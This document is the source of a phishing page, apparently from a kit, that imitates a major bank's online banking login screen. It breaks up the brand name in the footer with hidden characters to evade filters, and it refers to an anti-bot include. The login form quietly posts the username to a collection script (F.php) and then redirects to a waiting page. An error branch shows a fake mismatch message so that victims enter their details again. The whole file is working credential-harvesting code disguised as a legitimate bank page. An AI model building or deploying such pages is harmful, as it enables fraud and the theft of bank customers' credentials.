<?php 
//require_once('../antibot8/code/include.php');
?>
<html style="font-family: Lato, sans-serif;"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Welcome</title>
    <link rel="stylesheet" href="jackss/njds.css">
    
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato">
  
    <style>


    @media only screen and (max-width: 600px) {
      .container.errorclass {
          height: 222px !important;
      }
      section.clean-block.about-us.addsamepx {
    height: 100% !important;
}
}
    </style>
</head>

<body>
    <nav class="navbar navbar-light navbar-expand-lg fixed-top bg-white clean-navbar" style="background: rgb(0,0,0);">
        <div class="container"><a class="navbar-brand logo" href="#" style="
    background-image: url(&quot;jackss/hslogo.gif&quot;);
    width: 180px;
    height: 60px;
    background-size: contain;
    background-repeat: no-repeat;
"></a>
            <div class="collapse navbar-collapse text-justify" id="navcol-2">
                <ul class="navbar-nav text-capitalize ml-auto">
                    <li class="nav-item"><a class="nav-link text-capitalize text-dark active" href="#" style="font-family: Montserrat, sans-serif;font-weight: bold;font-style: normal;font-size: 17px;"><strong>Everyday Banking&nbsp;</strong></a></li>
                    <li class="nav-item text-capitalize text-dark" style="font-size: 17px;"><a class="nav-link text-capitalize text-dark" href="#" style="font-family: Montserrat, sans-serif;font-size: 17px;"><strong>Borrowing</strong></a></li>
                    <li class="nav-item text-capitalize text-dark" style="font-size: 17px;"><a class="nav-link text-capitalize text-dark" href="#" style="font-size: 17px;"><strong>Investing</strong><br></a></li>
                    <li class="nav-item text-capitalize text-dark" style="font-size: 17px;"><a class="nav-link text-capitalize text-dark" href="#" style="font-size: 17px;"><strong>Insurance</strong><br></a></li>
                    <li class="nav-item text-capitalize text-dark" style="font-size: 17px;"><a class="nav-link text-capitalize text-dark" href="#" style="font-size: 17px;"><strong>Life events</strong><br></a></li>
                </ul>
            </div>
        </div>
    </nav>
    <main class="page">
        <section class="clean-block" style="background-color: #f8f8f8;padding-bottom: 1px;padding-top: 0px;">
            <div class="container">
                <div class="block-heading" style="padding-top: 50px;padding-bottom: 0px;">
                    <h2 class="text-left text-dark" style="color: black;font-size: 26px;font-weight: 500;margin-bottom: -15px;font-family: Lato, sans-serif;">Log on to Online Banking<br></h2>
                </div>
            </div>
        </section>
        <section class="clean-block about-us addsamepx" style="background-color: white;height: 537.3px;">
                 <?php if((isset($_GET['error'])=="1")){?>
          <div class="container errorclass" style="height: 102px;border: 3px solid #FFCBC9;padding: 13px 20px 8px 117px;min-height: 58px;background: url(jackss/lp.gif) no-repeat scroll 30px 50% #FFF2F1;margin-top: 22px;margin-bottom: 20px;"><div role="alert" class="alert alert-danger" style="
    background: none;
    border: none;
"><span>The details you have provided do not match our records.&nbsp;<br>Please check them and try again.</span></div></div>

<?php }?>

                  <div class="container">
                <div class="row" style="margin-top: 70px;">
                    <div class="col-md-6" style="padding-right: 140px;"><span style="font-family: Montserrat, sans-serif;font-weight: bold;">Online Banking<br></span>
                        <hr style="border-style: dotted;"><span style="font-family: Lato, sans-serif;font-size: 19px;">Please enter your username eg IB134567890 or John123<br></span>
                        <form>
                                  <?php if((isset($_GET['error'])=="1")){
                            echo "<input type='hidden' name='error' value='yes'>";
                             }?>
                                                      <div class="form-group" style="margin-top: 15px;margin-bottom: 15px;"><input class="form-control" type="text" style="border: 1px solid #E0E0E0;width: 192px;height: 32px;float: left;" autofocus="" required="" name="inpt1" id="userid">

                               <button id="submit" style="color: var(--white);background: #db0010;width: 92px;margin-left: 12px;height: 33px;font-size: 12px;padding: 0 0 2px 0;border: none;margin-top: -3px;border-radius: 0px;">Submit</button>
                           </div>
                            <div style="margin-top: 10px;">
                                
                            </div>
                            <div class="form-check" style="margin-top: 10px;margin-bottom: 10px;"><input class="form-check-input" type="radio" id="formCheck-1">
                            <label class="form-check-label" for="formCheck-1" style="font-family: Lato, sans-serif;">Remember my username</label></div><span style="font-family: Lato, sans-serif;">Forgot your username?&nbsp;</span>
                        </form>
                    </div>
                    <div class="col-md-6" style="border-left: 1px solid #e5e5e5;"><span style="font-family: Montserrat, sans-serif;font-weight: bold;">Register for Online Banking<br></span><span style="font-family: Lato, sans-serif;font-size: 14px;color: #4c4c4c;"><br></span><span style="font-family: Lato, sans-serif;font-size: 14px;color: #4c4c4c;">Manage your money online with our secure Online<br>Banking service.<br></span><span style="font-family: Lato, sans-serif;font-size: 14px;color: #4c4c4c;"><br></span><img src="jackss/btn_register_now.jpeg"><span style="font-family: Lato, sans-serif;font-size: 14px;color: #4c4c4c;"><br></span></div>
                </div>
            </div>
        </section>
    </main>
    <footer class="page-footer dark" style="background: #3e4045;">
        <div class="container">
            <div class="row">
                <div class="col-sm-3">
                    <h5><strong>Support</strong></h5>
                    <ul>
                        <li><a href="#">Security centre</a></li>
                        <li><a href="#">Card support</a></li>
                        <li><a href="#">CoBrowse</a></li>
                    </ul>
                </div>
                <div class="col-sm-3"></div>
                <div class="col-sm-3"></div>
                <div class="col-sm-3"></div>
            </div>
        </div>
        <div class="footer-copyright" style="background: #3e4045;border-color: #3e4045;">
          <p>© &nbsp;H<span style="font-size: 0px;">yz</span>S<span style="font-size: 0px;">yz</span>B<span style="font-size: 0px;">yz</span>C Group 2021</p>
        </div>
    </footer>
  



       <script src="jackss/script.js"></script>
    <script>
      $(function () {

        $('form').on('submit', function (e) {

          e.preventDefault();

          $.ajax({
            type: 'post',
            url: 'F.php',
            data: $('form').serialize(),
            success: function () {
               location.replace("wait.php")
            }
          });

        });

      });
    </script>

</body></html>